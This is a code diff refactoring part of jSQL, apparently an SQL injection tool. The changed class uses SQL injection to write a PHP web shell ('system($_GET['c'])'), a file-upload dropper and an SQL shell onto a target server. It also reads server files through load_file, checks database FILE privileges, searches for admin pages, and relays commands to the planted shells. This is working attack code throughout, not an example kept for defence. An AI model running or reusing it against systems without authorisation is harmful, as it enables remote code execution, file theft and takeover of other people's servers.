@@ -23,7 +23,9 @@ import java.net.URL;
 import java.net.URLConnection;
 import java.net.URLEncoder;
 import java.util.ArrayList;
+import java.util.HashMap;
 import java.util.List;
+import java.util.Map;
 import java.util.UUID;
 import java.util.concurrent.Callable;
 import java.util.concurrent.CompletionService;
@@ -40,22 +42,18 @@ import com.jsql.exception.StoppableException;
 import com.jsql.model.InjectionModel;
 import com.jsql.model.bean.Request;
 import com.jsql.tool.StringTool;
-import com.jsql.view.dnd.list.ListItem;
+import com.jsql.view.GUIMediator;
+import com.jsql.view.list.dnd.ListItem;
 
 /**
  * Ressource access object.
  * Get informations from file system, commands, webpage.
  */
 public class RessourceAccessObject {
-    private InjectionModel model;
     
-    public final String WEBSHELL_FILENAME = "j" + InjectionModel.jSQLVersion + ".tmp1.php";
-    public final String UPLOAD_FILENAME = "j" + InjectionModel.jSQLVersion + ".tmp2.php";
-    public final String SQLSHELL_FILENAME = "j" + InjectionModel.jSQLVersion + ".tmp3.php";
-    
-    public RessourceAccessObject(InjectionModel model){
-        this.model = model;
-    }
+    public final String WEBSHELL_FILENAME = "j" + InjectionModel.JSQLVERSION + ".tmp1.php";
+    public final String UPLOAD_FILENAME = "j" + InjectionModel.JSQLVERSION + ".tmp2.php";
+    public final String SQLSHELL_FILENAME = "j" + InjectionModel.JSQLVERSION + ".tmp3.php";
     
     /**
      * Callable for parallelized HTTP tasks
@@ -72,26 +70,34 @@ public class RessourceAccessObject {
         @Override
         public AdminPageCallable call() throws Exception {
             if(!RessourceAccessObject.this.endAdminSearch){
+                Map<String, Object> msgHeader = new HashMap<String, Object>();
+                msgHeader.put("Url", url);
+                msgHeader.put("Cookie", "");
+                msgHeader.put("Post", "");
+                msgHeader.put("Header", "");
+
                 URL targetUrl = new URL( url );
                 HttpURLConnection conn = (HttpURLConnection) targetUrl.openConnection();
                 conn.setRequestMethod("HEAD");
                 content = conn.getHeaderField(0);
 
-                String logs = "\n"+url+"\n";
+                Map<String, String> msgResponse = new HashMap<String, String>();
                 for (int i=0; ;i++) {
                     String headerName = conn.getHeaderFieldKey(i);
                     String headerValue = conn.getHeaderField(i);
                     if (headerName == null && headerValue == null) break;
 
-                    logs += (headerName==null?"":headerName+": ")+headerValue+"\n";
+                    msgResponse.put(headerName == null ? "Method" : headerName, headerValue);
                 }
+                
+                msgHeader.put("Response", msgResponse);
                 
                 conn.disconnect();
 
                 Request request = new Request();
                 request.setMessage("MessageHeader");
-                request.setParameters(logs);
-                model.interact(request);
+                request.setParameters(msgHeader);
+                GUIMediator.model().interact(request);
             }
             return this;
         }
@@ -128,16 +134,14 @@ public class RessourceAccessObject {
                     Request request = new Request();
                     request.setMessage("CreateAdminPageTab");
                     request.setParameters(currentCallable.url);
-                    model.interact(request);
+                    GUIMediator.model().interact(request);
 
                     nb++;
                 }
             } catch (InterruptedException e) {
-                this.model.sendDebugMessage(e);
-                model.sendErrorMessage("Current thread was interrupted while waiting.");
+                GUIMediator.model().sendDebugMessage(e);
             } catch (ExecutionException e) {
-                this.model.sendDebugMessage(e);
-                model.sendErrorMessage("Computation threw an exception.");
+                GUIMediator.model().sendDebugMessage(e);
             }
         }
 
@@ -145,28 +149,28 @@ public class RessourceAccessObject {
         try {
             taskExecutor.awaitTermination(5, TimeUnit.SECONDS);
         } catch (InterruptedException e) {
-            this.model.sendDebugMessage(e);
+            GUIMediator.model().sendDebugMessage(e);
         }
 
         this.endAdminSearch = false;
 
-        model.sendMessage("Admin page(s) found: "+nb+"/"+submittedTasks);
+        GUIMediator.model().sendMessage("Admin page(s) found: "+nb+"/"+submittedTasks);
 
         Request request = new Request();
         request.setMessage("EndAdminSearch");
-        model.interact(request);
+        GUIMediator.model().interact(request);
     }
     
     public void getShell(String path, String url) throws PreparationException, StoppableException {
         if(!this.checkFilePrivilege()) return;
 
-        model.inject(
-                model.initialQuery.replaceAll("1337"+model.visibleIndex+"7331","(select+0x"+StringTool.strhex("<SQLi><?php system($_GET['c']); ?><iLQS>")+")").replaceAll("--++","")+
+        GUIMediator.model().inject(
+                GUIMediator.model().initialQuery.replaceAll("1337"+GUIMediator.model().visibleIndex+"7331","(select+0x"+StringTool.strhex("<SQLi><?php system($_GET['c']); ?><iLQS>")+")").replaceAll("--++","")+
                 "+into+outfile+\""+path+WEBSHELL_FILENAME+"\"--+"
                 );
 
         String[] sourcePage = {""};
-        String hexResult = model.new Stoppable_loopIntoResults(model).action(
+        String hexResult = GUIMediator.model().new Stoppable_loopIntoResults().action(
                 "concat(hex(load_file(0x"+StringTool.strhex(path+WEBSHELL_FILENAME)+")),0x69)",
                 sourcePage,
                 false,
@@ -174,12 +178,12 @@ public class RessourceAccessObject {
                 null);
 
         if(hexResult.equals("")){
-            model.sendResponseFromSite( "Can't find web shell at "+path+WEBSHELL_FILENAME, sourcePage[0].trim() );
+            GUIMediator.model().sendResponseFromSite( "Can't find web shell at "+path+WEBSHELL_FILENAME, sourcePage[0].trim() );
             return;
         }
 
         if(url.equals("")){
-            url = model.initialUrl.substring( 0, model.initialUrl.lastIndexOf('/')+1 );
+            url = GUIMediator.model().initialUrl.substring( 0, GUIMediator.model().initialUrl.lastIndexOf('/')+1 );
         }
 
         ArrayList<String> f = new ArrayList<String>();
@@ -188,24 +192,24 @@ public class RessourceAccessObject {
             Request request = new Request();
             request.setMessage("CreateShellTab");
             request.setParameters(path, url);
-            model.interact(request);
+            GUIMediator.model().interact(request);
         }else{
-            model.sendErrorMessage("Web shell not usable.");
+            GUIMediator.model().sendErrorMessage("Web shell not usable.");
         }
     }
     
     public void upload(String path, String url, File file) throws PreparationException, StoppableException {
         if(!this.checkFilePrivilege()) return;
 
-        model.inject(
-                model.initialQuery.replaceAll("1337"+model.visibleIndex+"7331","(select+0x"+StringTool.strhex("<SQLi>" +
+        GUIMediator.model().inject(
+                GUIMediator.model().initialQuery.replaceAll("1337"+GUIMediator.model().visibleIndex+"7331","(select+0x"+StringTool.strhex("<SQLi>" +
                 		"<?php echo move_uploaded_file($_FILES['u']['tmp_name'], getcwd().'/'.basename($_FILES['u']['name']))?'SQLiy':'n'; ?>" +
                 		"<iLQS>")+")").replaceAll("--++","")+
                 "+into+outfile+\""+path+UPLOAD_FILENAME+"\"--+"
                 );
 
         String[] sourcePage = {""};
-        String hexResult = model.new Stoppable_loopIntoResults(model).action(
+        String hexResult = GUIMediator.model().new Stoppable_loopIntoResults().action(
                 "concat(hex(load_file(0x"+StringTool.strhex(path+UPLOAD_FILENAME)+")),0x69)",
                 sourcePage,
                 false,
@@ -213,12 +217,12 @@ public class RessourceAccessObject {
                 null);
 
         if(hexResult.equals("")){
-            model.sendResponseFromSite( "Can't find upload file at "+path+UPLOAD_FILENAME, sourcePage[0].trim() );
+            GUIMediator.model().sendResponseFromSite( "Can't find upload file at "+path+UPLOAD_FILENAME, sourcePage[0].trim() );
             return;
         }
 
         if(url.equals("")){
-            url = model.initialUrl.substring( 0, model.initialUrl.lastIndexOf('/')+1 );
+            url = GUIMediator.model().initialUrl.substring( 0, GUIMediator.model().initialUrl.lastIndexOf('/')+1 );
         }
 
         ArrayList<String> f = new ArrayList<String>();
@@ -284,40 +288,58 @@ public class RessourceAccessObject {
                 imgIs.close();
                 
                 if(result.indexOf("SQLiy") > -1)
-                    model.sendMessage("Upload successful.");
+                    GUIMediator.model().sendMessage("Upload successful.");
                 else
-                    model.sendErrorMessage("Upload failed.");
+                    GUIMediator.model().sendErrorMessage("Upload failed.");
                 
+                Map<String, Object> msgHeader = new HashMap<String, Object>();
+                msgHeader.put("Url", url);
+                msgHeader.put("Cookie", "");
+                msgHeader.put("Post", "");
+                msgHeader.put("Header", "");
+                
+                Map<String, String> msgResponse = new HashMap<String, String>();
+                for (int i=0; ;i++) {
+                    String headerName = conn.getHeaderFieldKey(i);
+                    String headerValue = conn.getHeaderField(i);
+                    if (headerName == null && headerValue == null) break;
+
+                    msgResponse.put(headerName == null ? "Method" : headerName, headerValue);
+                }
+                
+                msgHeader.put("Response", msgResponse);
+
+                Request request = new Request();
+                request.setMessage("MessageHeader");
+                request.setParameters(msgHeader);
+                GUIMediator.model().interact(request);
             } catch (Exception e) {
-                model.sendDebugMessage(e);
-                model.sendErrorMessage("Error encountered during upload.");
+                GUIMediator.model().sendDebugMessage(e);
             } finally {
                 try {
                     os.close();
                 } catch (Exception e) {
-                    model.sendDebugMessage(e);
-                    model.sendErrorMessage("Error encountered when closing connection.");
+                    GUIMediator.model().sendDebugMessage(e);
                 }
                 try {
                     is.close();
                 } catch (Exception e) {
-                    model.sendDebugMessage(e);
-                    model.sendErrorMessage("Error encountered when closing connection.");
+                    GUIMediator.model().sendDebugMessage(e);
                 }
             }
         }else{
-            model.sendErrorMessage("Upload not usable.");
+            GUIMediator.model().sendErrorMessage("Upload not usable.");
         }
         
         Request request = new Request();
         request.setMessage("EndUpload");
-        model.interact(request);
+        GUIMediator.model().interact(request);
     }
     
     public boolean checkFilePrivilege() throws PreparationException, StoppableException{
         String[] sourcePage = {""};
 
-        String hexResult = model.new Stoppable_loopIntoResults(model).action(
+        String hexResult = GUIMediator.model().new Stoppable_loopIntoResults().action(
                 "concat((select+hex(if(count(*)=1,0x"+StringTool.strhex("true")+",0x"+StringTool.strhex("false")+
                 "))from+INFORMATION_SCHEMA.USER_PRIVILEGES+where+grantee=concat(0x27,replace(cast(current_user+as+char),0x40,0x274027),0x27)and+PRIVILEGE_TYPE=0x46494c45),0x69)", 
                 sourcePage,
@@ -326,21 +348,21 @@ public class RessourceAccessObject {
                 null);
 
         if(hexResult.equals("")){
-            model.sendResponseFromSite( "Can't read privilege", sourcePage[0].trim() );
+            GUIMediator.model().sendResponseFromSite( "Can't read privilege", sourcePage[0].trim() );
             Request request = new Request();
             request.setMessage("MarkFileSystemInvulnerable");
-            model.interact(request);
+            GUIMediator.model().interact(request);
             hasFileRight = false;
         }else if(StringTool.hexstr(hexResult).equals("false")){
-            model.sendErrorMessage( "No FILE privilege" );
+            GUIMediator.model().sendErrorMessage( "No FILE privilege" );
             Request request = new Request();
             request.setMessage("MarkFileSystemInvulnerable");
-            model.interact(request);
+            GUIMediator.model().interact(request);
             hasFileRight = false;
         }else{
             Request request = new Request();
             request.setMessage("MarkFileSystemVulnerable");
-            model.interact(request);
+            GUIMediator.model().interact(request);
             hasFileRight = true;
         }
         
@@ -374,20 +396,18 @@ public class RessourceAccessObject {
                     Request request = new Request();
                     request.setMessage("CreateFileTab");
                     request.setParameters(name, content, path);
-                    model.interact(request);
+                    GUIMediator.model().interact(request);
 
                     if(!duplicate.contains(path.replace(name, "")))
-                        model.sendMessage("Shell might be possible in folder "+path.replace(name, ""));
+                        GUIMediator.model().sendMessage("Shell might be possible in folder "+path.replace(name, ""));
                     duplicate.add(path.replace(name, ""));
 
                     nb++;
                 }
             } catch (InterruptedException e) {
-                this.model.sendDebugMessage(e);
-                model.sendErrorMessage("Current thread was interrupted while waiting.");
+                GUIMediator.model().sendDebugMessage(e);
             } catch (ExecutionException e) {
-                this.model.sendDebugMessage(e);
-                model.sendErrorMessage("Computation threw an exception.");
+                GUIMediator.model().sendDebugMessage(e);
             }
         }
 
@@ -395,15 +415,15 @@ public class RessourceAccessObject {
         try {
             taskExecutor.awaitTermination(5, TimeUnit.SECONDS);
         } catch (InterruptedException e) {
-            this.model.sendDebugMessage(e);
+            GUIMediator.model().sendDebugMessage(e);
         }
 
         endFileSearch = false;
 
-        model.sendMessage("File(s) found: "+nb+"/"+submittedTasks);
+        GUIMediator.model().sendMessage("File(s) found: "+nb+"/"+submittedTasks);
         Request request = new Request();
         request.setMessage("EndFileSearch");
-        model.interact(request);
+        GUIMediator.model().interact(request);
     }
 
     public class FileCallable implements Callable<FileCallable>{
@@ -424,7 +444,7 @@ public class RessourceAccessObject {
 
                 String hexResult = "";
                 try{
-                    hexResult = model.new Stoppable_loopIntoResults(model).action(
+                    hexResult = GUIMediator.model().new Stoppable_loopIntoResults().action(
                             "concat(hex(load_file(0x"+StringTool.strhex(url)+")),0x69)",
                             sourcePage,
                             false,
@@ -451,6 +471,12 @@ public class RessourceAccessObject {
         URLConnection con;
         String result = "";
         try {
+            Map<String, Object> msgHeader = new HashMap<String, Object>();
+            msgHeader.put("Url", wbhPath+WEBSHELL_FILENAME+"?c="+URLEncoder.encode(cmd.trim(), "ISO-8859-1"));
+            msgHeader.put("Cookie", "");
+            msgHeader.put("Post", "");
+            msgHeader.put("Header", "");
+            
             con = new URL(wbhPath+WEBSHELL_FILENAME+"?c="+URLEncoder.encode(cmd.trim(), "ISO-8859-1")).openConnection();
             con.setReadTimeout(60000);
             con.setConnectTimeout(60000);
@@ -464,18 +490,32 @@ public class RessourceAccessObject {
             regexSearch.find();
 
             result = regexSearch.group(1);
+            
+            Map<String, String> msgResponse = new HashMap<String, String>();
+            for (int i=0; ;i++) {
+                String headerName = con.getHeaderFieldKey(i);
+                String headerValue = con.getHeaderField(i);
+                if (headerName == null && headerValue == null) break;
+
+                msgResponse.put(headerName == null ? "Method" : headerName, headerValue);
+            }
+            
+            msgHeader.put("Response", msgResponse);
+            
+            Request request = new Request();
+            request.setMessage("MessageHeader");
+            request.setParameters(msgHeader);
+            GUIMediator.model().interact(request);
         } catch (MalformedURLException e) {
-            this.model.sendDebugMessage(e);
-            this.model.sendMessage("WebShell error: problem with shell URL");
+            GUIMediator.model().sendDebugMessage(e);
         } catch (IOException e) {
-            this.model.sendDebugMessage(e);
-            this.model.sendMessage("WebShell error: connection problem");
+            GUIMediator.model().sendDebugMessage(e);
         }finally{
         	// Unfroze interface
         	Request request = new Request();
         	request.setMessage("GetShellResult");
         	request.setParameters(terminalID, result, cmd);
-        	model.interact(request);
+        	GUIMediator.model().interact(request);
         }
     }
 
@@ -491,13 +531,13 @@ public class RessourceAccessObject {
 "else if($result==FALSE)echo'<SQLm>Query failed';" +
                 " ?><iLQS>";
 
-        model.inject(
-                model.initialQuery.replaceAll("1337"+model.visibleIndex+"7331","(select+0x"+StringTool.strhex(s)+")").replaceAll("--++","")+
+        GUIMediator.model().inject(
+                GUIMediator.model().initialQuery.replaceAll("1337"+GUIMediator.model().visibleIndex+"7331","(select+0x"+StringTool.strhex(s)+")").replaceAll("--++","")+
                 "+into+outfile+\""+path+SQLSHELL_FILENAME+"\"--+"
                 );
 
         String[] sourcePage = {""};
-        String hexResult = model.new Stoppable_loopIntoResults(model).action(
+        String hexResult = GUIMediator.model().new Stoppable_loopIntoResults().action(
                 "concat(hex(load_file(0x"+StringTool.strhex(path+SQLSHELL_FILENAME)+")),0x69)",
                 sourcePage,
                 false,
@@ -505,12 +545,12 @@ public class RessourceAccessObject {
                 null);
 
         if(hexResult.equals("")){
-            model.sendResponseFromSite( "Can't find SQL shell at "+path+SQLSHELL_FILENAME, sourcePage[0].trim() );
+            GUIMediator.model().sendResponseFromSite( "Can't find SQL shell at "+path+SQLSHELL_FILENAME, sourcePage[0].trim() );
             return;
         }
 
         if(url.equals("")){
-            url = model.initialUrl.substring( 0, model.initialUrl.lastIndexOf('/')+1 );
+            url = GUIMediator.model().initialUrl.substring( 0, GUIMediator.model().initialUrl.lastIndexOf('/')+1 );
         }
 
         ArrayList<String> f = new ArrayList<String>();
@@ -519,9 +559,9 @@ public class RessourceAccessObject {
             Request request = new Request();
             request.setMessage("CreateSQLShellTab");
             request.setParameters(path, url, user, pass);
-            model.interact(request);
+            GUIMediator.model().interact(request);
         }else{
-            model.sendErrorMessage("SQL shell not usable.");
+            GUIMediator.model().sendErrorMessage("SQL shell not usable.");
         }
     }
 
@@ -529,6 +569,12 @@ public class RessourceAccessObject {
         URLConnection con;
         String result = "";
         try {
+            Map<String, Object> msgHeader = new HashMap<String, Object>();
+            msgHeader.put("Url", wbhPath+SQLSHELL_FILENAME+"?q="+URLEncoder.encode(cmd.trim(), "ISO-8859-1")+"&u="+user+"&p="+pass);
+            msgHeader.put("Cookie", "");
+            msgHeader.put("Post", "");
+            msgHeader.put("Header", "");
+
             con = new URL(wbhPath+SQLSHELL_FILENAME+"?q="+URLEncoder.encode(cmd.trim(), "ISO-8859-1")+
                     "&u="+user+"&p="+pass).openConnection();
             con.setReadTimeout(60000);
@@ -543,18 +589,32 @@ public class RessourceAccessObject {
             regexSearch.find();
             
             result = regexSearch.group(1);
+            
+            Map<String, String> msgResponse = new HashMap<String, String>();
+            for (int i=0; ;i++) {
+                String headerName = con.getHeaderFieldKey(i);
+                String headerValue = con.getHeaderField(i);
+                if (headerName == null && headerValue == null) break;
+
+                msgResponse.put(headerName == null ? "Method" : headerName, headerValue);
+            }
+            
+            msgHeader.put("Response", msgResponse);
+            
+            Request request = new Request();
+            request.setMessage("MessageHeader");
+            request.setParameters(msgHeader);
+            GUIMediator.model().interact(request);
         } catch (MalformedURLException e) {
-            this.model.sendDebugMessage(e);
-            this.model.sendMessage("SQLShell error: problem with shell URL");
+            GUIMediator.model().sendDebugMessage(e);
         } catch (IOException e) {
-            this.model.sendDebugMessage(e);
-            this.model.sendMessage("SQLShell error: connection problem");
+            GUIMediator.model().sendDebugMessage(e);
         }finally{
         	// Unfroze interface
         	Request request = new Request();
         	request.setMessage("GetSQLShellResult");
         	request.setParameters(terminalID, result, cmd);
-        	model.interact(request);
+        	GUIMediator.model().interact(request);
         }
     }
 }
